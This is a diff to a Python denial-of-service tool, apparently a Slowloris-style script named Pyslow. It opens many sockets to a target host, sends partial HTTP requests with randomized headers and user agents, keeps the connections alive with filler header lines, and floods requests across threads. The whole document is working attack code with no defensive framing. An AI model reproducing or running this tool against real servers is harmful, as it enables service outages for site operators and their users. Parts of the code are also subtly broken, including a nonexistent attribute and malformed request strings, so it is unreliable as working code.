@@ -88,10 +88,13 @@ class Pyslow_request(Thread):
 	def __init__(self,tgt):
 		Thread.__init__(self)
 		self.tgt = tgt
-		self.method = ['GET','POST']
-		self.__run()
-	def __run(self):
-		self.slow_requester()
+		ts = []
+		try:
+			t = Thread(target=self.slow_requester)
+			t.daemon=True;ts.append(t)
+			t.start()
+		except KeyboardInterrupt:
+			sys.exit(cprint('[-] Canceled by user','red'))
 	def create_header(self):
 		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
 		acceptEc = ['compress,gzip','','*','compress;q=0,5, gzip;q=1.0','gzip;q=1.0, indentity; q=0.5, *;q=0']
@@ -137,7 +140,8 @@ class Pyslow_request(Thread):
 		except KeyboardInterrupt:
 			sys.exit(cprint('[-] Canceled by user','red'))
 		except Exception:
-			cprint('\tOopps target too busy now !','red')
+			pass
+
 class Pyslow():
 	def __init__(self,tgt,port,to,threads,sleep):
 		self.tgt = tgt
@@ -147,47 +151,62 @@ class Pyslow():
 		self.sleep = sleep
 		self.method = ['GET','POST']
 		self.sockets = []
+		self.pkt_count = 0
+		self.resock = []
 		self.pkt=self.create_packet()
 	def create_packet(self):
-		pkt=str(choice(self.method)+'/'+str(randint(100,777))+'HTTP/1.1\r\n\r\nHost:'+self.tgt+'User-Agent:'+choice(add_useragent())+'\r\n'+'Content-Length:'+str(randint(45,700))+'\r\n').encode('utf-8')
+		pkt=str(choice(self.method)+'/'+str(' ?')+str(randint(100,777))+'HTTP/1.1\r\n\r\nHost:'+self.tgt+'User-Agent:'+choice(add_useragent())+'\r\n'+'Content-Length:'+str(randint(45,700))+'\r\n').encode('utf-8')
 		return pkt
 	def create_socket(self):
 		x=0
+		setdefaulttimeout(self.to)
+		cprint('\t\tBuilding sockets','blue')
 		while x < (self.threads):
-			cprint('\t\tBuilding sockets','blue')
 			sock=socket(AF_INET,SOCK_STREAM)
-			if sock:
-				sock.settimeout(self.to)
 			self.sockets.append(sock)
 			x+=1
 			if x > self.threads:
 				break
-		cprint('Sending packets....\t\tSending packets....\n\tSending packets...','blue')
-		time.sleep(5)
+		time.sleep(2)
 	def slower(self):
 		self.create_socket()
-		pkt_count = 0
+		working = 0
 		for slow in self.sockets:
 			try:
 				slow.connect((self.tgt,self.port))
+				self.resock.append(slow)
 				if slow.sendto(self.pkt,(self.tgt,self.port)):
-					pkt_count+=1
-					print colored('\t\tI have sent ','green') + str(colored(pkt_count,'cyan')) + colored(' packets successfully.','green') 
+					self.pkt_count+=3 ;working=1
 					screenLock.acquire()
-					slow.shutdown(1)
-					slow.close()
 				else:
 					cprint('The target maybe bussy','red')
 					screenLock.acquire()
-					slow.shutdown(1)
-					slow.close()
 			except KeyboardInterrupt:
 				sys.exit(cprint('[-] Canceled by user','red'))
+			except:
+				pass
 			finally:
 				screenLock.release()
-		self.stime()
-	def stime(self):
-		time.sleep(self.sleep)
+		self.sending_data()
+	def sending_data(self):
+		cprint('\tSending data...','green')
+		for x in self.resock:
+			try:
+				if x.sendall('X-a: b\r\n'):
+					x.shutdown(1)
+					x.close()
+					self.pkt_count+=self.pkt_count
+				else:
+					x.shutdown(1)
+					x.close()
+			except KeyboardInterrupt:
+				sys.exit(cprint('[-] Canceled by user','red'))
+			except:
+				pass
+		print colored('I have sent ','green') + str(colored(self.pkt_count,'cyan')) + colored(' packets successfully.','green')
+		if time.sleep(self.st):
+			t=Pyslow_request(self.tgt)
+			t.slow_requester()
 class Requester(Thread):
 	def __init__(self,tgt,threads):
 		Thread.__init__(self)
@@ -203,8 +222,8 @@ class Requester(Thread):
 				self.port = 443
 		else:
 			self.port = 80
-		self.__run()
-	def __run(self):
+		self._run()
+	def _run(self):
 		self.requesting()
 	def header(self):
 		cachetype = ['no-cache','no-store','max-age='+str(randint(0,10)),'max-stale='+str(randint(0,100)),'min-fresh='+str(randint(0,10)),'notransform','only-if-cache']
@@ -445,10 +464,9 @@ Example:
 				for x in range(threads):
 					t1=Pyslow_request(tgt)
 					ts.append(t1);t1.daemon=True
-					t1.start()
-				t1.join(1)
-				pyslow=Pyslow(tgt,port,to,threads,st)
-				pyslow.slower()
+					t1.start();t1.join(1)
+					pyslow=Pyslow(tgt,port,to,threads,st)
+					pyslow.slower()
 		except KeyboardInterrupt:
 			sys.exit(cprint('[-] Canceled by user','red'))
 
